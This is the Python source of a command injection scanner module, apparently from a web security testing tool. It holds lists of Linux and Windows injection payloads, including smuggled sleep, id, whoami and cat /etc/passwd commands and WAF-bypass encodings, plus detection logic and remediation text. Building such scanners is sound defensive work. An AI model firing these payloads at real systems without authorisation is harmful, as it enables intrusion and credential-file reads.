"""OS Command Injection Scanner — Deep, multi-vector detection.

Covers:
  - Time-based blind (sleep, ping, for Linux + Windows)
  - Output-based (id, cat, type, echo, whoami)
  - Inline execution (backticks, $(), process substitution)
  - Chained operators (;, |, ||, &&, &, newline)
  - POST body and JSON body injection
  - WAF bypass (encoding, newlines, tabs, IFS)
  - Double/triple encoding
"""
from __future__ import annotations
import asyncio, time
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# ── Time-based payloads ───────────────────────────────────────

TIME_PAYLOADS = [
    # Linux — various injection points
    {"payload": ";sleep 5;", "delay": 5, "os": "linux"},
    {"payload": "|sleep 5|", "delay": 5, "os": "linux"},
    {"payload": "`sleep 5`", "delay": 5, "os": "linux"},
    {"payload": "$(sleep 5)", "delay": 5, "os": "linux"},
    {"payload": "%0asleep 5%0a", "delay": 5, "os": "linux"},
    {"payload": "||sleep 5||", "delay": 5, "os": "linux"},
    {"payload": "&&sleep 5&&", "delay": 5, "os": "linux"},
    {"payload": "\nsleep 5\n", "delay": 5, "os": "linux"},
    {"payload": "';sleep 5;'", "delay": 5, "os": "linux"},
    {"payload": '";sleep 5;"', "delay": 5, "os": "linux"},
    # Linux — WAF bypass
    {"payload": ";sl${IFS}eep${IFS}5;", "delay": 5, "os": "linux"},
    {"payload": ";s]l]e]e]p 5;", "delay": 5, "os": "linux"},
    {"payload": ";{sleep,5};", "delay": 5, "os": "linux"},
    {"payload": "$({sleep,5})", "delay": 5, "os": "linux"},
    {"payload": ";sleep$IFS'5';", "delay": 5, "os": "linux"},
    # Windows
    {"payload": "& ping -n 6 127.0.0.1 &", "delay": 5, "os": "windows"},
    {"payload": "| ping -n 6 127.0.0.1", "delay": 5, "os": "windows"},
    {"payload": "\nping -n 6 127.0.0.1\n", "delay": 5, "os": "windows"},
    {"payload": "& timeout /t 5 /nobreak &", "delay": 5, "os": "windows"},
    {"payload": "|| ping -n 6 127.0.0.1 ||", "delay": 5, "os": "windows"},
    {"payload": "&& ping -n 6 127.0.0.1 &&", "delay": 5, "os": "windows"},
]

# ── Output-based payloads ─────────────────────────────────────

OUTPUT_PAYLOADS = [
    # Linux — identity commands
    {"payload": ";id;", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "|id", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "`id`", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "$(id)", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "||id||", "signatures": ["uid=", "gid="], "os": "linux"},
    # Linux — file read
    {"payload": ";cat /etc/passwd;", "signatures": ["root:x:0"], "os": "linux"},
    {"payload": "$(cat /etc/passwd)", "signatures": ["root:x:0"], "os": "linux"},
    {"payload": "`cat /etc/passwd`", "signatures": ["root:x:0"], "os": "linux"},
    # Linux — whoami / uname
    {"payload": ";whoami;", "signatures": ["root", "www-data", "nobody", "apache", "nginx"], "os": "linux"},
    {"payload": "$(whoami)", "signatures": ["root", "www-data", "nobody", "apache", "nginx"], "os": "linux"},
    {"payload": ";uname -a;", "signatures": ["Linux", "x86_64", "GNU"], "os": "linux"},
    {"payload": "$(uname -a)", "signatures": ["Linux", "x86_64", "GNU"], "os": "linux"},
    # Linux — canary echo (definitive confirmation)
    {"payload": ";echo CMDINJ79831;", "signatures": ["CMDINJ79831"], "os": "linux"},
    {"payload": "$(echo CMDINJ79831)", "signatures": ["CMDINJ79831"], "os": "linux"},
    {"payload": "`echo CMDINJ79831`", "signatures": ["CMDINJ79831"], "os": "linux"},
    # Linux — WAF bypass
    {"payload": ";c${IFS}at${IFS}/etc/passwd;", "signatures": ["root:x:0"], "os": "linux"},
    {"payload": ";/bin/cat /etc/passwd;", "signatures": ["root:x:0"], "os": "linux"},
    {"payload": ";cat<>/etc/passwd;", "signatures": ["root:x:0"], "os": "linux"},
    # Windows
    {"payload": "& echo CMDINJ79831", "signatures": ["CMDINJ79831"], "os": "windows"},
    {"payload": "| echo CMDINJ79831", "signatures": ["CMDINJ79831"], "os": "windows"},
    {"payload": "| type C:\\windows\\win.ini", "signatures": ["[fonts]", "[extensions]"], "os": "windows"},
    {"payload": "& type C:\\windows\\win.ini", "signatures": ["[fonts]", "[extensions]"], "os": "windows"},
    {"payload": "| whoami", "signatures": ["\\"], "os": "windows"},
    {"payload": "& set", "signatures": ["COMPUTERNAME=", "PATH=", "PROCESSOR_"], "os": "windows"},
]

# ── Parameters likely to be passed to OS commands ─────────────

CMDINJECTION_PARAMS = {
    "cmd", "exec", "command", "run", "ping", "query", "jump",
    "file", "filename", "path", "dir", "folder", "log",
    "ip", "host", "hostname", "target", "domain", "url",
    "daemon", "upload", "download", "process", "execute",
    "email", "to", "from", "src", "source", "dest",
    "test", "debug", "action", "do", "func", "function",
    "step", "read", "val", "validate", "tool", "bin",
    "language", "interface", "type", "mode", "format",
}

REMEDIATION = (
    "Never pass user input to system commands. Use language-native APIs instead of "
    "shell commands (e.g., use net.Dial instead of ping, use os.stat instead of ls). "
    "If OS commands are unavoidable, use parameterized command arrays (not shell strings) "
    "and validate input against a strict whitelist. Apply the principle of least privilege "
    "for the application's OS user."
)


class CommandInjectionScanner(BaseScanner):
    name = "command_injection"
    description = "Detects OS command injection via time-based, output-based, and encoding bypass"
    tags = ["injection", "rce", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        seen = set()
        tasks = []

        for url, params in state.target.discovered_params.items():
            for param in params:
                is_suspicious = param.lower() in CMDINJECTION_PARAMS

                if is_suspicious:
                    # Full test suite
                    tasks.append(self._test_time_based(url, param, "GET", "query"))
                    tasks.append(self._test_output_based(url, param, "GET", "query"))
                    # POST body
                    tasks.append(self._test_time_based(url, param, "POST", "body"))
                    tasks.append(self._test_output_based(url, param, "POST", "body"))
                    # JSON body
                    tasks.append(self._test_output_based(url, param, "POST", "json"))
                else:
                    # Light test — time-based only (less noise)
                    tasks.append(self._test_time_based(url, param, "GET", "query"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter, r.vuln_type)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test_time_based(self, url, param, method, inject_in) -> Optional[Finding]:
        """Test for blind command injection using time delays."""
        # Measure baseline response time
        baseline_start = time.monotonic()
        baseline_resp, _ = await self.test_payload(url, method, param, "harmless", inject_in=inject_in)
        baseline_time = time.monotonic() - baseline_start

        if not baseline_resp:
            return None

        for p in TIME_PAYLOADS:
            for variant in self.get_waf_bypass_variants(p["payload"], "cmdi"):
                try:
                    start = time.monotonic()
                    resp, raw_req = await self.test_payload(
                        url, method, param, variant, inject_in=inject_in
                    )
                    elapsed = time.monotonic() - start

                    if not resp:
                        continue

                    expected_min = baseline_time + p["delay"] - 1.5
                    if elapsed >= expected_min and elapsed >= p["delay"] * 0.7:
                        self.record_payload_result(variant, "cmdi", success=True)
                        return self.make_finding(
                            title=f"Blind OS Command Injection in '{param}'",
                            vuln_type="command_injection_time",
                            severity=Severity.CRITICAL,
                            url=url, parameter=param, method=method, payload=variant,
                            evidence=(
                                f"Time-based: baseline={baseline_time:.1f}s, "
                                f"with payload={elapsed:.1f}s (delay: {p['delay']}s, OS: {p['os']})"
                            ),
                            request=raw_req,
                            cwe_id="CWE-78",
                            owasp_category="A03:2021 - Injection",
                            description=(
                                f"Parameter '{param}' ({method} {inject_in}) is passed to an OS command. "
                                f"Injecting {p['os']} sleep command caused a {elapsed:.1f}s delay. "
                                f"This confirms server-side command execution."
                            ),
                            remediation=REMEDIATION,
                            poc_steps=[
                                f"1. {method} {url} with normal value → {baseline_time:.1f}s",
                                f"2. Set {param}={variant} (in {inject_in})",
                                f"3. Response delayed to {elapsed:.1f}s (confirms {p['os']} execution)",
                                "4. Escalate: ;id; or ;cat /etc/passwd; for output",
                                "5. Full system: reverse shell, file read, lateral movement",
                            ],
                        )
                except Exception:
                    continue
        return None

    async def _test_output_based(self, url, param, method, inject_in) -> Optional[Finding]:
        """Test for command injection by checking for known command output."""
        # Get baseline to check for pre-existing signatures
        baseline_resp, _ = await self.test_payload(url, method, param, "harmless_value", inject_in=inject_in)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for p in OUTPUT_PAYLOADS:
            for variant in self.get_waf_bypass_variants(p["payload"], "cmdi"):
                resp, raw_req = await self.test_payload(
                    url, method, param, variant, inject_in=inject_in
                )
                if not resp:
                    continue

                body = resp.text
                for sig in p["signatures"]:
                    if sig in body and sig not in baseline_text:
                        self.record_payload_result(variant, "cmdi", success=True)
                        return self.make_finding(
                            title=f"OS Command Injection in '{param}'",
                            vuln_type="command_injection_output",
                            severity=Severity.CRITICAL,
                            url=url, parameter=param, method=method, payload=variant,
                            evidence=f"Command output: '{sig}' in response (OS: {p['os']})",
                            request=raw_req, response=body[:500],
                            cwe_id="CWE-78",
                            owasp_category="A03:2021 - Injection",
                            description=(
                                f"Parameter '{param}' ({method} {inject_in}) is vulnerable to "
                                f"OS command injection. The injected command's output appeared "
                                f"in the response. OS: {p['os']}."
                            ),
                            remediation=REMEDIATION,
                            poc_steps=[
                                f"1. {method} {url}",
                                f"2. Set {param}={variant} (in {inject_in})",
                                f"3. Command executes on server ({p['os']})",
                                f"4. Output visible in response: {sig}",
                                "5. Impact: full system access — read files, reverse shell, pivot",
                            ],
                        )
        return None
